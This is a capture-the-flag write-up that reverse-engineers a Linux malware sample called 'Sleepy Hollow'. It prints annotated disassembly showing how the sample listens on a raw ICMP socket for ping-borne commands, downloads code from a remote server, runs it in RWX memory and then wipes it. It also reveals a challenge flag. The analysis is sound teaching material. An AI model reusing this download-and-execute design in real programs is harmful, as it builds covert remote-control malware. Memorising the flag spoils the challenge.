@@ -1,0 +1,417 @@
+In Part I 20 and Part II 1 we manage to reverse the dropper and extract the malware. We have already got the first flag from the malware sample. Now it is time to analyse the sample and get the rest of the flags.
+
+The sample we are going to analyse has a moderate complexity and a manual approach as we have used before may require quite some effort. For that reason I have been working on a adding STAN the capability to generate pseudocode out of the binary. This has not been released yet, as it is still is an experimental feature and… to be honest, the code sucks and I will be ashamed the rest of my live. However it is good enough to illustrate this write-up.
+
+Taking a look
+As usual, the first thing we should do is to take a look to the file. The file command will tell us that the sample is a Linux x86-64 dynamic and non-stripped binary. Those are good news :). string will show a bunch of interesting strings and also the first flag!
+
+Let’s take a look to the program sections:
+
+$ readelf -S sample.1
+There are 33 section headers, starting at offset 0x202240:
+
+Section Headers:
+  [Nr] Name              Type             Address           Offset
+       Size              EntSize          Flags  Link  Info  Align
+  [ 0]                   NULL             0000000000000000  00000000
+       0000000000000000  0000000000000000           0     0     0
+  [ 1] .textD            PROGBITS         0000000000500000  00100000
+       0000000000000016  0000000000000000  AX       0     0     1
+  [ 2] .textP            PROGBITS         0000000000501000  00101000
+       000000000000000b  0000000000000000  AX       0     0     1
+  [ 3] .textE            PROGBITS         0000000000502000  00102000
+       000000000000000b  0000000000000000  AX       0     0     1
+  [ 4] .interp           PROGBITS         0000000000400270  00000270
+       000000000000001c  0000000000000000   A       0     0     1
+(...)
+  [15] .plt              PROGBITS         0000000000400920  00000920
+       0000000000000180  0000000000000010  AX       0     0     16
+  [16] .text             PROGBITS         0000000000400aa0  00000aa0
+       0000000000000922  0000000000000000  AX       0     0     16
+(...)
+I have removed part of the output to save space. As you can see, in addition to the usual .text segment, we can find 3 additional segments starting at 0x500000 (.textD), 0x501000 (.textP) and 0x502000 (.textE), all of them with execution permissions. Let’s take a quick look to the segments:
+
+$ readelf -l sample.1
+
+Elf file type is EXEC (Executable file)
+Entry point 0x400aa0
+There are 10 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
+                 0x0000000000000230 0x0000000000000230  R E    8
+  INTERP         0x0000000000000270 0x0000000000400270 0x0000000000400270
+                 0x000000000000001c 0x000000000000001c  R      1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
+                 0x000000000000178c 0x000000000000178c  R E    200000
+  LOAD           0x0000000000100000 0x0000000000500000 0x0000000000500000
+                 0x000000000000200b 0x000000000000200b  RWE    200000
+  LOAD           0x0000000000201e10 0x0000000000601e10 0x0000000000601e10
+                 0x00000000000002e4 0x00000000000002f8  RW     200000
+  DYNAMIC        0x0000000000201e28 0x0000000000601e28 0x0000000000601e28
+                 0x00000000000001d0 0x00000000000001d0  RW     8
+(...)
+
+ Section to Segment mapping:
+  Segment Sections...
+   00
+   01     .interp
+   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .re
+la.dyn .rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame
+   03     .textD .textP .textE
+   04     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss
+   05     .dynamic
+   06     .note.ABI-tag .note.gnu.build-id
+(...)
+Fine, .textD, .textP and .textE are all mapped to segment 3 that… that read, write and execution permissions. It is very likely that code will be generated or dumped on those segments during the program execution.
+
+Let’s start to look at the code
+
+Analysing main
+As I said at the beginning, I will not go in all the nifty gifty details of the code. I will use the experimental STAN pseudo code feature and I have already renamed the local variables to improve readability.
+
+I know that, figuring out all those variables is not that straightforward. If any of you is trying this on their own and get stuck at some point not discussed here, please comment below.
+
+The STAN case file I will be using on this write-up is here:
+
+H4sIAI66s1kAA3WUzY6bMBSF9zxFljPSNLIdwoClLqokVaNpJ1GStouqsoxxUpRgkIFOM09fGxx+
+YmBln+/44nt97T0WvCCS04jELMkw+OcCEPqRsxwB9YDNjs6PO8clJzLMPkAIfCzpG8lTdubFuA0B
+nJYFCcvjkcsxG3Ixo4LK67SHR6MC38fZuYo67gkQFloed3hNlF/Q/e3scQbrxHnAVGk6MzMIQ2WK
+0jdxSWnUaktbqwfHMFB/b2C7fdCIJM5IXshhm9vaslQWg6bAa015/M4HTG15b2QwktfZVXOstm2O
+GnGa0yiSev8lK6ZxNuz3hv3DZnckeJX/Hic0Fm1tl/15NYCzOVChK9B0oQswlSdm6SoXpf+905t6
+WX5Fek1/R0HVaSyJ7lG/YfurZl6Fbr3ah9CzWuDOgHBGr5pDOzLqtwayHMC9rbaYbqyskMTeE/Lx
+JU0zwtLsSsxywoQ+Hn0B5kB/+lI0k2oAtaruWDtZdib4QcSXR+crlrwopSDAPEGQKa13f6e71eH7
+7tVwBBVvsmSpEJwVpiMg77KTCpLkJ8N8t8vqnxoUhAqxP5ydVXaSJnndVwAipetS1HupahCLuDCY
+2vhGdA6ZTBnPb7GiqPP7+p1RpzHviMiIz3pxKc5C6Sq/JKGifmZUu2lkHYWJhmA4SKeLL6vFi/G4
+kZ2SqmERi5Kb24RcY5l2iqTkwFmYXJ4pri/E5GH7maxfV4fJxwl6muw3ixey+/RTzWZPk/V2u9sc
+NmS9+LZVCnx0/gPcNp6ylgYAAA==
+Use the classical cat file | gunzip | base64 -d > sample.1.srep to generate the file.
+
+Let’s look at main
+
+Note: I will remove the opcode on the left to improve readability
+
+main: 
+00400fb9:   push rbp                              │
+00400fba:   mov	rbp, rsp                          │rbp = rsp
+00400fbd:   push	rbx                       │
+00400fbe:   sub	rsp, 0x478                        │rsp = rsp - 1144
+00400fc5:   mov	dword ptr [rbp - 0x474], edi      │{argc} = rdi
+00400fcb:   mov	qword ptr [rbp - 0x480], rsi      │{argv} = rsi
+00400fd2:   mov	rax, qword ptr fs:[0x28]          │rax = fs:[0x28]
+00400fdb:   mov	qword ptr [rbp - 0x18], rax       │{canary} = fs:[0x28]
+00400fdf:   xor	eax, eax                          │eax = 0
+00400fe1:   call	<geteuid@plt>             │=> geteuid@plt  (rdi,rsi,rdx,rcx);
+00400fe6:   test	eax, eax                  │eax == geteuid@plt (rdi,...)
+00400fe8:   je	<check_params>                    │-> isEqual goto <check_params>
+00400fea:   mov	rax, qword ptr [rip + 0x201107]   │rax =  0x6020f8 <stderr@@GLIBC_2.2.5>
+00400ff1:   mov	rcx, rax                          │rcx =  0x6020f8 <stderr@@GLIBC_2.2.5>
+00400ff4:   mov	edx, 0x19                         │edx = 25
+00400ff9:   mov	esi, 1                            │esi = 1
+00400ffe:   mov	edi, 0x401497                     │edi = 'Run me as root... Please\n'
+00401003:   call	<fwrite@plt>              │=> fwrite@plt  ('Run me as root... Please\n',1,25, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+00401008:   mov	eax, 0xffffffff                   │eax = -1
+0040100d:   jmp	<main.return>                     │-> goto  <main.return>
+We just store argc and argv in local variables, set up the stack canary and then we call the geteuid function, to retrieve the current effective user id. Note that STAN does not know anything about the functions prototypes, so it always prints 4 parameters just as a helper for the user. It is up to us to know the number of parameters relevant for each function and interpret the pseudo-code accordingly. In this case geteuid does not expect any parameter.
+
+Tip: Use the manpages to check the signature of the functions that you do not know.
+
+Then the program checks the user, and stops with an error in case it is not root.
+
+check_params:
+00401012:   cmp	dword ptr [rbp - 0x474], 2        │if {argc} ComparedTo 2
+00401019:   je	<l21>                             │-> isEqual goto <l21>
+0040101b:   mov	rax, qword ptr [rip + 0x2010d6]   │rax =  0x6020f8 <stderr@@GLIBC_2.2.5>
+00401022:   mov	rcx, rax                          │rcx =  0x6020f8 <stderr@@GLIBC_2.2.5>
+00401025:   mov	edx, 0x1d                         │edx = 29
+0040102a:   mov	esi, 1                            │esi = 1
+0040102f:   mov	edi, 0x4014b1                     │edi = 'Invalid number of parameters\n'
+00401034:   call	<fwrite@plt>              │=> fwrite@plt  ('Invalid number of parameters\n',1,29, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+00401039:   mov	eax, 0xffffffff                   │eax = -1
+0040103e:   jmp	<main.return>                     │-> goto  <main.return>
+This is pretty easy to interpret using the pseudo-code. It just checks if the number of parameters is 2, otherwise, the program terminates with an error message. So, the program expects 1 parameter… but we already knew that.
+
+Initialisation
+Let’s see that comes next:
+
+l21:                                          │
+00401043:   mov	edi, 0x4014cf                 │edi = 'CTF{Sl33py H0loW}'
+00401048:   call	<puts@plt>            │=> puts@plt  ('CTF{Sl33py H0loW}',1,29, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+Fair enough, the sample introduces itself. Nice to meet you `Sl33py H0loW’.
+
+0040104d:   mov	esi, 0x1000                   │esi = 4096
+00401052:   mov	edi, 0x500000                 │edi = d
+00401057:   call	<mlock@plt>           │=> mlock@plt  (d,4096,29, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+0040105c:   mov	esi, 0x1000                   │esi = 4096
+00401061:   mov	edi, 0x501000                 │edi = p
+00401066:   call	<mlock@plt>           │=> mlock@plt  (p,4096,29, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+The mlock function tells the operating system that the pages indicated have to be always resident en memory and should not be swapped out to the disk. Looks like the malware writer wanted to be sure that whatever code gets generated in those addresses does not end up in the hard drive by mistake. Scroll up a bit and check the addresses of those suspicious sections… Well we can also see how the program assigned a symbol to the start address of the first two sections:
+
+d -> 0x50000
+p -> 0x50100
+Let’s continue:
+
+0040106b:   mov	edx, 1                        │edx = 1
+00401070:   mov	esi, 3                        │esi = 3
+00401075:   mov	edi, 2                        │edi = 2
+0040107a:   call	<socket@plt>          │=> socket@plt  (2,3,1, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+0040107f:   mov	dword ptr [rbp - 0x464], eax  │{raw_socket} = socket@plt (2,...)
+00401085:   cmp	dword ptr [rbp - 0x464], 0    │if {raw_socket} ComparedTo 0
+0040108c:   jns	<main_read_loop_init>         │-> isNotNegative goto <main_read_loop_init>
+0040108e:   mov	edi, 0x401486                 │edi = 'socket:'
+00401093:   call	<perror@plt>          │=> perror@plt  ('socket:',3,1, 0x6020f8 <stderr@@GLIBC_2.2.5>  );
+00401098:   mov	eax, 0xffffffff               │eax = -1
+0040109d:   jmp	<main.return>                 │-> goto  <main.return>
+So, this is a simple piece of code to create a socket and, in case of an error, report it and exit. The interesting part arises when we translate the socket parameters. You need to check the values using the system header files. But do not worry, I have already done this for you. The socket call is translated into:
+
+socket (PF_INET = 2, SOCK_RAW = 3, IPPROTO_ICMP = 1)
+So, this little guy is creating a RAW socket to capture ICMP packets!!!..
+
+A command loop
+What comes next is a very basic command loop. Let’s see the code to understand what it does:
+
+main_read_loop_init:
+004010a2:   mov	dword ptr [rbp - 0x460], 0        │{net_cmd} = 0
+main_read_loop:                                          
+004010ac:   lea	rcx, qword ptr [rbp - 0x440]      │rcx = & {pkt_buf}
+004010b3:   mov	eax, dword ptr [rbp - 0x464]      │eax = {raw_socket}
+004010b9:   mov	edx, 0x41c                        │edx = 1052
+004010be:   mov	rsi, rcx                          │rsi = {pkt_buf}
+004010c1:   mov	edi, eax                          │edi = {raw_socket}
+004010c3:   call	<net_read_icmp>           │=> net_read_icmp  ({raw_socket},{icmp_pkt},1052,{icmp_pkt});
+004010c8:   mov	dword ptr [rbp - 0x470], eax      │{pkt_nread} = net_read_icmp ({raw_socket},...)
+004010ce:   mov	eax, dword ptr [rbp - 0x470]      │eax = {pkt_nread}
+004010d4:   test	eax, eax                  │eax == {pkt_nread}
+004010d6:   jg	<process>                         │-> isGreat goto <process>
+004010d8:   jmp	<main_read_loop_continue>         │-> goto  <main_read_loop_continue>
+(.....)
+
+main_read_loop_continue: 
+00401324:   jmp	<main_read_loop>                  │-> goto  <main_read_loop>
+As you can see we have an infinite loop (there is no loop control variable), calling a function named net_read_icmp. We have to analyse that function. I have already figured out what the function does and assigned proper names to the parameters and return value. But do not worry, we will just go into net_read_icmp in a sec.
+
+So the sample, will wait for something coming from the network. Probably an ICMP package, according to the socket call we have seen earlier. Then it repeats forever, and, whenever something is read, it jumps to the process label… just below this code chunk.
+
+Reversing net_read_icmp
+This is a small function and pretty straight forward to analyse. Let’s take a look to the beginning of the function.
+
+net_read_icmp:
+00400b8d:   push	rbp                       │
+00400b8e:   mov	rbp, rsp                          │rbp = rsp
+00400b91:   push	rbx                       │
+00400b92:   sub	rsp, 0x468                        │rsp = rsp - 1128
+00400b99:   mov	dword ptr [rbp - 0x454], edi      │{raw_socket} = rdi
+00400b9f:   mov	qword ptr [rbp - 0x460], rsi      │{out_buffer} = rsi
+00400ba6:   mov	qword ptr [rbp - 0x468], rdx      │{ls_rbp-1128} = rdx
+00400bad:   mov	rax, qword ptr fs:[0x28]          │rax = fs:[0x28]
+00400bb6:   mov	qword ptr [rbp - 0x18], rax       │{canary.net_read_icmp} = fs:[0x28]
+00400bba:   xor	eax, eax                          │eax = 0
+00400bbc:   lea	rcx, qword ptr [rbp - 0x440]      │rcx = & {pkt_buf}
+00400bc3:   mov	eax, dword ptr [rbp - 0x454]      │eax = {raw_socket}
+00400bc9:   mov	edx, 0x41c                        │edx = 1052
+00400bce:   mov	rsi, rcx                          │rsi = {pkt_buf}
+00400bd1:   mov	edi, eax                          │edi = {raw_socket}
+00400bd3:   call	<read@plt>                │=> read@plt  ({raw_socket},{pkt_buf},1052,{pkt_buf});
+00400bd8:   mov	dword ptr [rbp - 0x444], eax      │{nread} = read@plt ({raw_socket},...)
+This piece of code is very useful. Using the variables we have already identified in main (raw_socket) and the parameters that read expects to receive, we can easily assign all the variables except out_buffer. This will become clear when we look to the next piece of code. Anyway, the code above, just reads a 1052 bytes long packet from the network and stores it in a local buffer.
+
+00400bde:   movzx	eax, byte ptr [rbp - 0x42c]│eax = {pkt_buf[14]}
+00400be5:   movzx	edx, al                   │edx = {pkt_buf[14]}
+00400be8:   mov	eax, dword ptr [rip + 0x201502]   │eax = icmp_type  ''
+00400bee:   cmp	edx, eax                          │if edx ComparedTo eax
+00400bf0:   jne	<return_0>                        │-> isNotEqual goto <return_0>
+Now it checks some content in the packet. The read buffer is located at rbp - 0x460 and we are trying to read rbp - 0x42c. Subtracting this two values we can conclude that we are accessing byte 14th in the packet received from the network. That value is compared with a global var named icmp_type, that contains value:
+
+STAN] > mem.dump x 6020f0 10
++ Dumping 10 items from segment '.data'
+          | 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f |0123456789abcdef
+----------+-------------------------------------------------+----------------
+0x6020f0 : 08 00 00 00 47 43 43 3a 20 28                    |....GCC: (
+Note: Future versions of STAN will allow to use symbols with mem.dump, for the time being you need to get the symbol address with core.symbols
+
+Let’s finish the analysis of the function, before diving deep into this offset and value. For now, what we know, is that, when the received packet does not match certain condition, the function will return 0.
+
+00400bf2:   mov	eax, dword ptr [rbp - 0x444]      │eax = {nread}
+00400bf8:   movsxd	rdx, eax                  │rdx = {nread}
+00400bfb:   lea	rcx, qword ptr [rbp - 0x440]      │rcx = & {pkt_buf}
+00400c02:   mov	rax, qword ptr [rbp - 0x460]      │rax = {out_buffer}
+00400c09:   mov	rsi, rcx                          │rsi = {pkt_buf}
+00400c0c:   mov	rdi, rax                          │rdi = {out_buffer}
+00400c0f:   call	<memcpy@plt>              │=> memcpy@plt  ({out_buffer},{pkt_buf},{nread},{pkt_buf});
+00400c14:   mov	eax, dword ptr [rbp - 0x444]      │eax = {nread}
+00400c1a:   jmp	<net_read_icmp.RETURN>            │-> goto  <net_read_icmp.RETURN>
+return_0:
+00400c1c:   mov	eax, 0                            │eax = 0
+net_read_icmp.RETURN:
+00400c21:   mov	rbx, qword ptr [rbp - 0x18]       │rbx = {canary.net_read_icmp}
+00400c25:   xor	rbx, qword ptr fs:[0x28]          │rbx = {canary.net_read_icmp} ^ fs:[0x28]
+00400c2e:   je	<l9>                              │-> isEqual goto <l9>
+00400c30:   call	<__stack_chk_fail@plt>    │=> __stack_chk_fail@plt  ({out_buffer},{pkt_buf},{nread},{pkt_buf});
+l9:
+00400c35:   add	rsp, 0x468                        │rsp = rsp - 1128 + 1128
+00400c3c:   pop	rbx                               │
+00400c3d:   pop	rbp                               │
+00400c3e:   ret	                                  │
+The code above is pretty simple. The function just copies the content of the ICMP packet read from the network into the buffer passed as second parameter. Now we can call that parameter out_buffer. The function also returns the number of bytes read from the network… Which is what we have already represented in the main function.
+
+ICMP Packets
+We still need to know what that offset 0x14 (20), represents. Actually we could obviate this, but it is cool to look into packets :). So, our socket is configured to receive ICMP packets (that IPRPOTO_ICMP thing). That kind of sockets will deliver a packet following the format:
+
+IP HEADER|ICMP HEADER                |             | DATA
+---------+---------------------------+-------------+----
+         | Type    | Code   | ChkSum | Rest Header |
+---------+---------+--------+--------+-------------+----
+20 bytes | 1 bytes | 1 byte | 2 byte | 4 bytes     |
+So, the offset 20 directly points to the ICMP message type. You may recall that the value at offset 20 (0x14) was checked against a symbol named icmp_type containing the value 8. Checking the ICMP spec we will find out that value 8 correspond to ICMP messages of type HELO… in other words… just a ping.
+
+Now we know that the sample is commanded using specially crafted ping messages from a remote host… well, you may not know yet, but you will know soon.
+
+Processing Commands
+Time to come back to main. Now we know that ping messages will fire the command execution on the main function. Now we have to know what those commands are and what they do. Let’s take from where we leave it.
+
+process:
+004010dd:   movzx eax, byte ptr [rbp - 0x413]     │eax = {ls_rbp-1043}
+004010e4:   movzx eax, al                         │eax = {ls_rbp-1043}
+004010e7:   mov	dword ptr [rbp - 0x460], eax      │{net_cmd} = {ls_rbp-1043}
+004010ed:   cmp	dword ptr [rbp - 0x460], 0x44     │if {net_cmd} ComparedTo 44
+004010f4:   jne	<download1>                       │-> isNotEqual goto <download1>
+004010f6:   mov	edi, 0x4014e1                     │edi = 'Sleepy Hollow 2.173b'
+004010fb:   call	<puts@plt>                │=> puts@plt  ('Sleepy Hollow 2.173b',{pkt_buf},1052,{pkt_buf});
+00401100:   jmp	<main_read_loop_continue>         │-> goto  <main_read_loop_continue>
+Let’s do again some packet arithmetic. The main function stores the packet at rbp - 0x440 and the program is poking a value from rbp - 0x413. That is 45 bytes from the beginning of the packet. We already learnt that the packet contains the IP and ICMP headers summing up to 28 bytes. Therefore, we are peeking at byte 17 in the packet data.
+
+Let’s take a look to the ICMP packets with wireshark. As we did in Part I, open the pcap file with wireshark, and type icmp in the filter box and press apply. You should get something like this:
+
+
+
+Now you can navigate all the ICMP requests and check that the data block is filled with a number… that is the remote command to control the sample!.
+
+So, the code above, represents the remote command 0x44 that instructs the sample to print its version number in the console… Not very exciting, so we better keep going.
+
+Remote commands
+In case the command is not 0x44, the following code will be executed:
+
+download1:
+00401105:   cmp	dword ptr [rbp - 0x460], 0        │if {net_cmd} ComparedTo 0
+0040110c:   jle	<unknown_command>                 │-> isLessOrEqual goto <unknown_command>
+00401112:   cmp	dword ptr [rbp - 0x460], 3        │if {net_cmd} ComparedTo 3
+00401119:   jg	<unknown_command>                 │-> isGreat goto <unknown_command>
+So, the only valid commands are 1 to 3. We can check with wireshark that all the commands received by the sample matches this condition. What more?
+
+0040111f:   mov	eax, dword ptr [rbp - 0x460]      │eax = {net_cmd}
+00401125:   sub	eax, 1                            │eax = {net_cmd} - 1
+00401128:   add	eax, eax                          │eax = {net_cmd} - 1 + eax
+0040112a:   mov	dword ptr [rbp - 0x460], eax      │{net_cmd} = {net_cmd} - 1 + eax
+00401130:   mov	eax, dword ptr [rbp - 0x460]      │eax = {net_cmd}
+00401136:   add	eax, 0x1f90                       │eax = {net_cmd} + 8080
+0040113b:   mov	dword ptr [rbp - 0x45c], eax      │{download_port} = {net_cmd} + 8080
+00401141:   mov	rax, qword ptr [rbp - 0x480]      │rax = {argv}
+00401148:   add	rax, 8                            │rax = {argv} + 8
+0040114c:   mov	rax, qword ptr [rax]              │rax = [{argv} + 8]
+0040114f:   lea	rdx, qword ptr [rbp - 0x470]      │rdx = & {pkt_nread}
+00401156:   mov	ecx, dword ptr [rbp - 0x45c]      │ecx = {download_port}
+0040115c:   mov	esi, ecx                          │esi = {download_port}
+0040115e:   mov	rdi, rax                          │rdi = [{argv} + 8]
+00401161:   call	<download>                │=> download  ([{argv} + 8],{download_port},{pkt_nread},{download_port});
+00401166:   mov	qword ptr [rbp - 0x458], rax      │{payload1} = download ([{argv} + 8],...)
+0040116d:   cmp	qword ptr [rbp - 0x458], 0        │if {payload1} ComparedTo 0
+00401175:   jne	<download2>                       │-> isNotEqual goto <download2>
+00401177:   jmp	<main_read_loop_continue>         │-> goto  <main_read_loop_continue>
+OK. After carefully renaming the local variables and analysis the download function, we get the pseudo-code above. I think it is pretty easy to see that the sample will try to download something from the server passed as first argument to the program when executed. The remote command will tell the sample which port should use, The port to connect follows the expression:
+
+target_port = 8080 + 2 * (net_cmd - 1) 
+So command 1 will connect to port 8080, command 2 will connect to port 8082 and command 3 will connect to port 8084.
+
+Note:In theory it should connect to different servers and not ports, however, I felt lazy to setup several servers and used the port alternative… code-wise is roughly the same thing
+
+I will not analyse the download function. This is left as an exercise to the reader… basically it is the same thing that we analysed for the dropper (actually the get_msg function is reused), so you shouldn’t have any major problem going through it. In case you have doubts check PartII 1 or comment below.
+
+You can see towards the end of the code we are analysing, a jump to a something labelled download2. Take a look to the code and you will find out that a second chunk of data is downloaded, but this time using odd ports. The code is basically the same, so I will skip it.
+
+Processing Payloads
+After downloading both payloads, we find a classical loop
+
+l28:
+004011f4:   nop	                                  │
+004011f5:   mov	qword ptr [rbp - 0x448], 0x500000 │{ptr_d} = d
+00401200:   mov	dword ptr [rbp - 0x468], 0        │{loop_copy_payload_cnt} = 0
+0040120a:   jmp	<loop_copy_payload1.CHECK>        │-> goto  <loop_copy_payload1.CHECK>
+unknown_command:
+0040120c:   mov	edi, 0x4014f6                     │edi = 'Unknown command...'
+00401211:   call	<puts@plt>                │=> puts@plt  ('Unknown command...',0,{pkt_nread},{download_port});
+00401216:   jmp	<main_read_loop_continue>         │-> goto  <main_read_loop_continue>
+loop_copy_payload1:
+0040121b:   mov	eax, dword ptr [rbp - 0x468]      │eax = {loop_copy_payload_cnt}
+00401221:   movsxd	rdx, eax                  │rdx = {loop_copy_payload_cnt}
+00401224:   mov	rax, qword ptr [rbp - 0x448]      │rax = {ptr_d}
+0040122b:   add	rdx, rax                          │{ptr_d} = {loop_copy_payload_cnt} + {ptr_d}
+0040122e:   mov	eax, dword ptr [rbp - 0x468]      │eax = {loop_copy_payload_cnt}
+00401234:   movsxd	rcx, eax                  │rcx = {loop_copy_payload_cnt}
+00401237:   mov	rax, qword ptr [rbp - 0x458]      │rax = {payload1}
+0040123e:   add	rax, rcx                          │{loop_copy_payload_cnt} = {payload1} + {loop_copy_payload_cnt}
+00401241:   movzx	eax, byte ptr [rax]       │eax = [{payload1} + {loop_copy_payload_cnt}]
+00401244:   mov	byte ptr [rdx], al                │[{loop_copy_payload_cnt} + {ptr_d}] = [{payload1} + {loop_copy_payload_cnt}]
+00401246:   add	dword ptr [rbp - 0x468], 1        │{loop_copy_payload_cnt} = {loop_copy_payload_cnt} + 1
+loop_copy_payload1.CHECK: 
+0040124d:   mov	eax, dword ptr [rbp - 0x470]      │eax = {pkt_nread}
+00401253:   cmp	dword ptr [rbp - 0x468], eax      │if {loop_copy_payload_cnt} ComparedTo eax
+00401259:   jl	<loop_copy_payload1>              │-> isLess goto <loop_copy_payload1>
+You can go through the asm and the pseudo-code and verify that this is a classical for loop copying the data received from the network to address 0x500000 associated to symbol d.
+
+0040125b:   mov	eax, dword ptr [rbp - 0x470]      │eax = {pkt_nread}
+00401261:   movsxd	rdx, eax                  │rdx = {pkt_nread}
+00401264:   mov	rax, qword ptr [rbp - 0x458]      │rax = {payload1}
+0040126b:   mov	esi, 0                            │esi = 0
+00401270:   mov	rdi, rax                          │rdi = {payload1}
+00401273:   call	<memset@plt>              │=> memset@plt  ({payload1},0,{pkt_nread},{loop_copy_payload_cnt});
+00401278:   mov	edx, dword ptr [rbp - 0x46c]      │edx = {download_size2}
+0040127e:   mov	rax, qword ptr [rbp - 0x450]      │rax = {payload2}
+00401285:   mov	esi, 0x501000                     │esi = p
+0040128a:   mov	rdi, rax                          │rdi = {payload2}
+0040128d:   call	<d>                       │=> d  ({payload2},p,{download_size2},{loop_copy_payload_cnt});
+00401292:   mov	eax, dword ptr [rbp - 0x470]      │eax = {pkt_nread}
+The next thing the sample does is to delete the payload1 buffer. In other words, it destroys the buffer containing the payload downloaded from the network. And just after that. It runs whatever code was downloaded from the network, passing as parameter the second payload, the symbol p (located 0x501000) and the size of the downloaded block.
+
+00401298:   cdqe	                          │
+0040129a:   mov	rdx, rax                          │rdx = {pkt_nread}
+0040129d:   mov	esi, 0                            │esi = 0
+004012a2:   mov	edi, 0x500000                     │edi = d
+004012a7:   call	<memset@plt>              │=> memset@plt  (d,0,{pkt_nread},{loop_copy_payload_cnt});
+004012ac:   mov	eax, dword ptr [rbp - 0x46c]      │eax = {download_size2}
+004012b2:   movsxd	rdx, eax                  │rdx = {download_size2}
+004012b5:   mov	rax, qword ptr [rbp - 0x450]      │rax = {payload2}
+004012bc:   mov	esi, 0                            │esi = 0
+004012c1:   mov	rdi, rax                          │rdi = {payload2}
+004012c4:   call	<memset@plt>              │=> memset@plt  ({payload2},0,{download_size2},{loop_copy_payload_cnt});
+004012c9:   mov	rax, qword ptr [rbp - 0x458]      │rax = {payload1}
+004012d0:   mov	rdi, rax                          │rdi = {payload1}
+004012d3:   call	<free@plt>                │=> free@plt  ({payload1},0,{download_size2},{loop_copy_payload_cnt});
+004012d8:   mov	rax, qword ptr [rbp - 0x450]      │rax = {payload2}
+004012df:   mov	rdi, rax                          │rdi = {payload2}
+004012e2:   call	<free@plt>                │=> free@plt  ({payload2},0,{download_size2},{loop_copy_payload_cnt});
+Then it zeros the code just executed at d, also zeros the payload2 buffer, containing the second download, and frees the memory allocated to store both payloads. At this point the code of the first payload has been executed and also deleted from memory.
+
+Finally, the second payload gets executed and destroyed immediately.
+
+004012ec:   call	<puts@plt>                │=> puts@plt  ('-----------------------------',0,{download_size2},{loop_copy_payload_cnt});
+004012f1:   mov	eax, 0                            │eax = 0
+004012f6:   call	<p>                       │=> p  ('-----------------------------',0,{download_size2},{loop_copy_payload_cnt});
+004012fb:   mov	edi, 0x401509                     │edi = '-----------------------------'
+00401300:   call	<puts@plt>                │=> puts@plt  ('-----------------------------',0,{download_size2},{loop_copy_payload_cnt});
+00401305:   mov	eax, dword ptr [rbp - 0x46c]      │eax = {download_size2}
+0040130b:   cdqe	                          │
+0040130d:   mov	rdx, rax                          │rdx = {download_size2}
+00401310:   mov	esi, 0                            │esi = 0
+00401315:   mov	edi, 0x501000                     │edi = p
+0040131a:   call	<memset@plt>              │=> memset@plt  (p,0,{download_size2},{loop_copy_payload_cnt});
+0040131f:   jmp	<main_read_loop>                  │-> goto  <main_read_loop>
+We could check the code at d and p, but we will not find anything there. According to our analysis, the code for those two functions is downloaded from the network.
+
+Conclusion
+We have finished analysing our sample. The program sleeps most of the time, waiting for an ICMP echo package to wake it up and perform some task. The task to be performed in not stored in the sample itself… it is a hollow program :slight_smile: (now you know where the name comes from!) but downloaded on request from some doggy server. The code is executed in order and then immediately destroyed.
+
+Now it is time to come back to the network dump and extract the payloads to figure out what they do… At this point you should have all the knowledge and tool required to extract the payloads and reverse them… Get all the flags!
+
